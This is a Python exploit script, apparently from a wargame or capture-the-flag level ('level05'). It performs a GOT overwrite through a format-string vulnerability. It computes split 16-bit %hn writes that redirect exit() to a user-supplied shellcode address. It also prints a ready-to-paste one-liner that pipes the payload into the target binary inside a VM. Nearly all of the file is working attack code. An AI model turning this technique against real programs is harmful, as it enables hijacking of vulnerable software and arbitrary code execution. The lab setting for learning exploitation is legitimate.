#!/usr/bin/env python3
"""
Level 5 Exploit - GOT Overwrite via Format String

Usage: python3 exploit.py <shellcode_address>
Example: python3 exploit.py 0xffffd87c
"""

import sys
import struct

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <shellcode_address>", file=sys.stderr)
    print("Example: python3 exploit.py 0xffffd87c", file=sys.stderr)
    sys.exit(1)

# Parse shellcode address
addr_str = sys.argv[1]
shellcode_addr = int(addr_str, 16) if addr_str.startswith('0x') else int(addr_str)

# GOT entry for exit()
exit_got = 0x080497e0

# Split address into two 16-bit parts
lower_bytes = shellcode_addr & 0xFFFF
upper_bytes = (shellcode_addr >> 16) & 0xFFFF

# Parameter positions (found by testing)
first_param = 10
second_param = 11

# Calculate padding
# First write: lower bytes (subtract 8 for the two addresses)
first_padding = lower_bytes - 8

# Second write: upper bytes
if upper_bytes <= lower_bytes:
    second_padding = (0x10000 + upper_bytes) - lower_bytes
else:
    second_padding = upper_bytes - lower_bytes

# Build payload using struct.pack for correct byte encoding
payload = (
    struct.pack('<I', exit_got) +      # Address 1 (little-endian)
    struct.pack('<I', exit_got + 2) +  # Address 2 (little-endian)
    f'%{first_padding}d%{first_param}$hn'.encode() +
    f'%{second_padding}d%{second_param}$hn'.encode()
)

# Debug info
print(f"[*] Shellcode address: 0x{shellcode_addr:08x}", file=sys.stderr)
print(f"[*] exit() GOT entry: 0x{exit_got:08x}", file=sys.stderr)
print(f"[*] Lower bytes: 0x{lower_bytes:04x} ({lower_bytes})", file=sys.stderr)
print(f"[*] Upper bytes: 0x{upper_bytes:04x} ({upper_bytes})", file=sys.stderr)
print(f"[*] First padding: {first_padding}", file=sys.stderr)
print(f"[*] Second padding: {second_padding}", file=sys.stderr)

# Generate Python one-liner for VM (Python 2.7 compatible)
# Use single quotes around the whole thing to prevent shell $ expansion
oneliner = (
    f'python -c \'print("\\x08\\x04\\x97\\xe0"[::-1] + '
    f'"\\x08\\x04\\x97\\xe2"[::-1] + '
    f'"%{first_padding}d%{first_param}$hn" + '
    f'"%{second_padding}d%{second_param}$hn")\' | ./level05'
)
print("[*] Copy this command to run in VM:", file=sys.stderr)
print(oneliner, file=sys.stderr)

# Output payload as bytes
sys.stdout.buffer.write(payload)
print()
print(payload)
